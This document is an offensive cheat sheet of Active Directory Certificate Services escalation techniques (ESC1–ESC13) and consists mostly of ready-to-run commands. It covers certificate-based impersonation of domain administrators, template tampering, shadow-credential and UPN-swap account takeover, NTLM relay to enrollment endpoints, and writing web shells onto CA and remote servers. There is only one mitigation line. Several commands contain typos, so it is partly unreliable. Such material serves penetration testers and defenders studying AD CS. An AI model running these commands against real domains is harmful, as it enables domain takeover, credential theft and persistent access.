# ADCS Domain Escalation Techniques

# ESC1 - Misconfigured Certificate Templates

### Domain Users can enroll in the VulnTemplate template, which can be used for client authentication and has ENROLLEE_SUPPLIES_SUBJECT set. This allows anyone to enroll in this template and specify an arbitrary Subject Alternative Name (i.e. as a DA). Allows additional identities to be bound to a certificate beyond the Subject.

## Requirements

#### 1) Template that allows for AD authentication

#### 2) ENROLLEE_SUPPLIES_SUBJECT flag

#### 3) PKINIT Client Authentication, Smart Card Logon, Any Purpose, or No EKU (Extended/Enhanced Key Usage)

## Exploitation

#### 1) Use Certify.exe to see if there are any vulnerable templates

    Certify.exe find /vulnerable

    Certify.exe find /vulnerable /currentuser

    certipy find -username john@corp.local -password Passw0rd -dc-ip 172.16.126.128

    (&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=1.3.6.1.4.1.311.20.2.2)(pkiextendedkeyusage=1.3.6.1.5.5.7.3.2)(pkiextendedkeyusage=1.3.6.1.5.2.3.4)(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*)))(mspkicertificate-name-flag:1.2.840.113556.1.4.804:=1))

#### 2) Use Certify, Certi or Certipy to request a Certificate and add an alternative name (user to impersonate)

    Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:localadmin

    certipy req -username john@corp.local -password Passw0rd! -target-ip ca.corp.local -ca 'corp-CA' -template 'VULN_TEMPLATE' -upn 'administrator@corp.local'

## Note: If you get the error The NETBIOS connection with the remote host timed out. please rerun the command.

#### 3) Use OpenSSL and convert the certificate, do not enter a password

    openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider" -out cert.pfx

#### 4) Move the cert.pfx file to the target machine filesystem and request a TGT for the altname user using Rubeus

    Rubeus.exe asktgt /user:domadmin /certificate:C:\Temp\cert.pfx /ptt

    certipy auth -pfx 'administrator.pfx' -username 'administrator' -domain 'corp.local' -dc-ip 172.16.19.100


## WARNING! These certificates will still be usable even if the user or computer resets their password!

# ESC2 - Misconfigured Certificate Templates

## Requirements

### Allows requesters to specify a Subject Alternative Name (SAN) in the CSR as well as allows Any Purpose EKU (2.5.29.37.0)

## Exploitation

#### 1) Find template

    (&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*))))

#### 2) Request a certificate specifying the /altname as a domain admin like in ESC1

# ESC3 - Misconfigured Enrollment Agent Templates

### ESC3 is when a certificate template specifies the Certificate Request Agent EKU (Enrollment Agent). This EKU can be used to request certificates on behalf of other users

## Exploitation

#### 1) Request a certificate based on the vulnerable certificate template ESC3.

    Certify.exe request /ca:DC01.DOMAIN.LOCAL\DOMAIN-CA /template:Vuln-EnrollmentAgent

    certipy req -username john@corp.local -password Passw0rd! -target-ip ca.corp.local' -ca 'corp-CA' -template 'templateName'

#### 2) Use the Certificate Request Agent certificate (-pfx) to request a certificate on behalf of other another user

    Certify.exe request /ca:DC01.DOMAIN.LOCAL\DOMAIN-CA /template:User /onbehalfof:CORP\itadmin /enrollment:enrollmentcert.pfx /enrollcertpwd:asdf

    certipy req -username john@corp.local -password Pass0rd! -target-ip ca.corp.local -ca 'corp-CA' -template 'User' -on-behalf-of 'corp\administrator' -pfx 'john.pfx'

#### 3) Use Rubeus with the certificate to authenticate as the other user

    Rubeus.exe asktgt /user:CORP\itadmin /certificate:itadminenrollment.pfx /password:asdf

# ESC4 - Access Control Vulnerabilities

### Enabling the mspki-certificate-name-flag flag for a template that allows for domain authentication, allow attackers to "push a misconfiguration to a template leading to ESC1 vulnerability

### ESC4 is when a user has write privileges over a certificate template. This can for instance be abused to overwrite the configuration of the certificate template to make the template vulnerable to ESC1.

## Exploitation

#### 1) Search for WriteProperty with value 00000000-0000-0000-0000-000000000000 using modifyCertTemplate

    python3 modifyCertTemplate.py domain.local/user -k -no-pass -template user -dc-ip DC_IP

#### 2) Add the ENROLLEE_SUPPLIES_SUBJECT (ESS) flag to perform ESC1

    python3 modifyCertTemplate.py domain.local/user -k -no-pass -template user -dc-ip DC_IP

    C:\>StandIn.exe --adcs --filter WebServer --ess --add (Add/remove ENROLLEE_SUPPLIES_SUBJECT flag from the WebServer template)

#### 3) Perform ESC1 and then restore the value

    python3 modifyCertTemplate.py domain.local/user -k -no-pass -template user -dc-ip DC_IP

### Using Certipy

#### 1) Make template vulnerable to ESC1

    certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -save-old

#### 2) Exploit ESC1

    certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template ESC4-Test -upn administrator@corp.local

#### 3) Restore config

    certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -configuration ESC4-Test.json

# ESC5 - Vulnerable PKI Object Access Control

### The extensive web of interconnected ACL-based relationships, which includes several objects beyond certificate templates and the certificate authority, can impact the security of the entire AD CS system. These objects, which can significantly affect security, encompass:

#### 1) The AD computer object of the CA server, which may be compromised through mechanisms like S4U2Self or S4U2Proxy.

#### 2) The RPC/DCOM server of the CA server.

#### 3) Any descendant AD object or container within the specific container path CN=Public Key Services,CN=Services,CN=Configuration,DC=<DOMAIN>,DC=<COM>. This path includes, but is not limited to, containers and objects such as the Certificate Templates container, Certification Authorities container, the NTAuthCertificates object, and the Enrollment Services Container.

### The security of the PKI system can be compromised if a low-privileged attacker manages to gain control over any of these critical components.

# ESC6 - EDITF_ATTRIBUTESUBJECTALTNAME2

### If this flag is set on the CA, any request (including when the subject is built from Active Directory) can have user defined values in the subject alternative name.

## Exploitation

#### 1) Use Certify.exe to check for UserSpecifiedSAN flag state which refers to the EDITF_ATTRIBUTESUBJECTALTNAME2 flag.

    Certify.exe cas

    Certify.exe find

#### 2) Request a certificate for a template and add an altname, even though the default User template doesn't normally allow to specify alternative names

    Certify.exe request /ca:dc.domain.local\theshire-DC-CA /template:User /altname:localadmin

    certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template User -upn administrator@corp.local

## Mitigation

### Remove the flag

    certutil.exe -config "CA01.domain.local\CA01" -setreg "policy\EditFlags" -EDITF_ATTRIBUTESUBJECTALTNAME2

# ESC7 - Vulnerable Certificate Authority Access Control 

## Exploitation

#### 1) Detect CAs that allow low privileged users the ManageCA or Manage Certificates permissions

    Certify.exe find /vulnerable

#### 2) Change the CA settings to enable the SAN extension for all the templates under the vulnerable CA (ESC6)

    Certify.exe setconfig /enablescan /restart

#### 3) Request the certificate with the desired SAN.

    Certify.exe request /template:User /altname:super.adm

#### 4) Grant approval if required or disable the approval requirement

    Certify.exe issue /id:[REQUEST ID] (Grant)

    Certify.exe setconfig /removeapproval /restart (Disable)

## Alternate Method: Certify and PSPKI

#### 1) # Request a certificate that will require an approval

    Certify.exe request /ca:dc.domain.local\theshire-DC-CA /template:ApprovalNeeded

#### 2) Use PSPKI module to approve the request

    Import-Module PSPKI

    Get-CertificationAuthority -ComputerName dc.domain.local | Get-PendingRequest -RequestID 336 | Approve-CertificateRequest

#### 3) Download the certificate

    Certify.exe download /ca:dc.domain.local\theshire-DC-CA /id:336

## Alternate Method: From ManageCA to RCE on ADCS server

#### 1) Get the current CDP list. Useful to find remote writable shares:

    Certify.exe writefile /ca:SERVER\ca-name /readonly

#### 2) Write an aspx shell to a local web directory:

    Certify.exe writefile /ca:SERVER\ca-name /path:C:\Windows\SystemData\CES\CA-Name\shell.aspx

#### 3) Write the default asp shell to a local web directory:

    Certify.exe writefile /ca:SERVER\ca-name /path:c:\inetpub\wwwroot\shell.asp

#### 4) Write a php shell to a remote web directory:

    Certify.exe writefile /ca:SERVER\ca-name /path:\\remote.server\share\shell.php /input

# ESC8 - AD CS Relay Attack

### An attacker can trigger a Domain Controller using PetitPotam to NTLM relay credentials to a host of choice. The Domain Controller’s NTLM Credentials can then be relayed to the Active Directory Certificate Services (AD CS) Web Enrollment pages, and a DC certificate can be enrolled. This certificate can then be used to request a TGT (Ticket Granting Ticket) and compromise the entire domain through Pass-The-Ticket.


## Exploitation

#### 1) Enumerate enabled HTTP ADCS Endponts

    Certify.exe cas

#### 2) The msPKI-Enrollment-Servers property is used by enterprise Certificate Authorities (CAs) to store Certificate Enrollment Service (CES) endpoints.

    certutil.exe -enrollmentServerURL -config DC01.DOMAIN.LOCAL\DOMAIN-CA

## OR

    Import-Module PSPKI

    Get-CertificationAuthority | select Name,Enroll* | Format-List *

#### 3) Use certipy (Force authentication first with techniques like PetitPotam or SpoolSample)

    certipy relay -ca ca.corp.local

# ESC9 - No Security Extension

### The new value CT_FLAG_NO_SECURITY_EXTENSION (0x80000) for msPKI-Enrollment-Flag, referred to as ESC9, prevents the embedding of the new szOID_NTDS_CA_SECURITY_EXT security extension in a certificate. This flag becomes relevant when StrongCertificateBindingEnforcement is set to 1 (the default setting), which contrasts with a setting of 2. Its relevance is heightened in scenarios where a weaker certificate mapping for Kerberos or Schannel might be exploited (as in ESC10), given that the absence of ESC9 would not alter the requirements.

## Requirements:

#### 1) StrongCertificateBindingEnforcement is not adjusted to 2 (with the default being 1), or CertificateMappingMethods includes the UPN flag.

#### 2) The certificate is marked with the CT_FLAG_NO_SECURITY_EXTENSION flag within the msPKI-Enrollment-Flag setting.

#### 3) Any client authentication EKU is specified by the certificate.

#### 4) GenericWrite permissions are available over any account to compromise another.

## Exploitation Scenario

### Suppose John@corp.local holds GenericWrite permissions over Jane@corp.local, with the goal to compromise Administrator@corp.local. The ESC9 certificate template, which Jane@corp.local is permitted to enroll in, is configured with the CT_FLAG_NO_SECURITY_EXTENSION flag in its msPKI-Enrollment-Flag setting.

### Initially, Jane's hash is acquired using Shadow Credentials, thanks to John's GenericWrite:

    certipy shadow auto -username John@corp.local -password Passw0rd! -account Jane

### Subsequently, Jane's userPrincipalName is modified to Administrator, purposely omitting the @corp.local domain part:

    certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Administrator

### This modification does not violate constraints, given that Administrator@corp.local remains distinct as Administrator's userPrincipalName.

### Following this, the ESC9 certificate template, marked vulnerable, is requested as Jane:

    certipy req -username jane@corp.local -hashes HASH -ca corp-DC-CA -template ESC9

### It's noted that the certificate's userPrincipalName reflects Administrator, devoid of any “object SID”.

### Jane's userPrincipalName is then reverted to her original, Jane@corp.local:

    certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Jane@corp.local

### Attempting authentication with the issued certificate now yields the NT hash of Administrator@corp.local. The command must include -domain DOMAIN due to the certificate's lack of domain specification:

    certipy auth -pfx adminitrator.pfx -domain corp.local

# ESC10 - Weak Certificate Mappings

### Two registry key values on the domain controller are referred to by ESC10:

#### 1) The default value for CertificateMappingMethods under HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\SecurityProviders\Schannel is 0x18 (0x8 | 0x10), previously set to 0x1F.

#### 2) The default setting for StrongCertificateBindingEnforcement under HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Kdc is 1, previously 0.

## Cases:

#### 1) When StrongCertificateBindingEnforcement is configured as 0.

#### 2) If CertificateMappingMethods includes the UPN bit (0x4).

## CASE 1

### With StrongCertificateBindingEnforcement configured as 0, an account A with GenericWrite permissions can be exploited to compromise any account B.

### For instance, having GenericWrite permissions over Jane@corp.local, an attacker aims to compromise Administrator@corp.local. The procedure mirrors ESC9, allowing any certificate template to be utilized.

### Initially, Jane's hash is retrieved using Shadow Credentials, exploiting the GenericWrite.

    certipy shadow autho -username John@corp.local -p Passw0rd! -a Jane

### Subsequently, Jane's userPrincipalName is altered to Administrator, deliberately omitting the @corp.local portion to avoid a constraint violation.

    certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Administrator

### Following this, a certificate enabling client authentication is requested as Jane, using the default User template.

    certipy req -ca 'corp-DC-CA' -username Jane@corp.local -hashes HASH

### Jane's userPrincipalName is then reverted to its original, Jane@corp.local.

    certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Jane@corp.local

### Authenticating with the obtained certificate will yield the NT hash of Administrator@corp.local, necessitating the specification of the domain in the command due to the absence of domain details in the certificate.

    certipy auth -pfx administrator.pfx -domain corp.local

## CASE 2

### With the CertificateMappingMethods containing the UPN bit flag (0x4), an account A with GenericWrite permissions can compromise any account B lacking a userPrincipalName property, including machine accounts and the built-in domain administrator Administrator.

### Here, the goal is to compromise DC$@corp.local, starting with obtaining Jane's hash through Shadow Credentials, leveraging the GenericWrite.

    certipy shadow auto -username John@corp.local -p Passw0rd! -account Jane

### Jane's userPrincipalName is then set to DC$@corp.local.

    certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn 'DC$@corp.local'

### A certificate for client authentication is requested as Jane using the default User template.

    certipy req -ca 'corp-DC-CA' -username Jane@corp.local -hashes HASH

### Jane's userPrincipalName is reverted to its original after this process.

    certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn 'Jane@corp.local'

### To authenticate via Schannel, Certipy’s -ldap-shell option is utilized, indicating authentication success as u:CORP\DC$.

    certipy auth -pfx dc.pfx -dc-ip 172.16.126.128 -ldap-shell

### Through the LDAP shell, commands such as set_rbcd enable Resource-Based Constrained Delegation (RBCD) attacks, potentially compromising the domain controller.

    certipy auth -pfx dc.pfx -dc-ip 172.16.126.128 -ldap-shell

### This vulnerability also extends to any user account lacking a userPrincipalName or where it does not match the sAMAccountName, with the default Administrator@corp.local being a prime target due to its elevated LDAP privileges and the absence of a userPrincipalName by default.

# ESC11 - Relaying NTLM to ICPR

### If CA Server Do not configured with IF_ENFORCEENCRYPTICERTREQUEST, it can be makes NTLM relay attacks without signing via RPC service. 

### You can use certipy to enumerate if Enforce Encryption for Requests is Disabled and certipy will show ESC11 Vulnerabilities.

    certipy relay -target 'rpc://DC01.domain.local' -ca 'DC01-CA' -dc-ip 192.168.100.100

## Note: For domain controllers, we must specify -template in DomainController.

# ESC12 - Shell access to ADCS CA with YubiHSM

### Administrators can set up the Certificate Authority to store it on an external device like the "Yubico YubiHSM2".

### If USB device connected to the CA server via a USB port, or a USB device server in case of the CA server is a virtual machine, an authentication key (sometimes referred to as a "password") is required for the Key Storage Provider to generate and utilize keys in the YubiHSM.

### This key/password is stored in the registry under HKEY_LOCAL_MACHINE\SOFTWARE\Yubico\YubiHSM\AuthKeysetPassword in cleartext.

## Exploitation

### If the CA's private key stored on a physical USB device when you got a shell access, it is possible to recover the key.

#### 1) In first, you need to obtain the CA certificate (this is public) and then:

    certutil -addstore -user my CA_certificate_file (Import it to the user store with CA certificate

    certutil -csp "YubiHSM Key Storage Provider" -repairstore -user my CA_Common_Name (Associated with the private key in the YubiHSM2 device)

#### 2) Finally, use the certutil -sign command to forge a new arbitrary certificate using the CA certificate and its private key.

# ESC13 - OID Group Link Abuse

### The msPKI-Certificate-Policy attribute allows the issuance policy to be added to the certificate template. The msPKI-Enterprise-Oid objects that are responsible for issuing policies can be discovered in the Configuration Naming Context (CN=OID,CN=Public Key Services,CN=Services) of the PKI OID container. A policy can be linked to an AD group using this object's msDS-OIDToGroupLink attribute, enabling a system to authorize a user who presents the certificate as though he were a member of the group.

### In other words, when a user has permission to enroll a certificate and the certificate is link to an OID group, the user can inherit the privileges of this group.

### Use Check-ADCSESC13.ps1 to find OIDToGroupLink: https://github.com/JonasBK/Powershell/blob/master/Check-ADCSESC13.ps1

## Exploitation

### Find a user permission it can use certipy find or Certify.exe find /showAllPermissions.

### If John have have permission to enroll VulnerableTemplate, the user can inherit the privileges of VulnerableGroup group.

### All it need to do just specify the template, it will get a certificate with OIDToGroupLink rights.

    certipy req -u "John@domain.local" -p "password" -dc-ip 192.168.100.100 -target "DC01.domain.local" -ca 'DC01-CA' -template 'VulnerableTemplate'

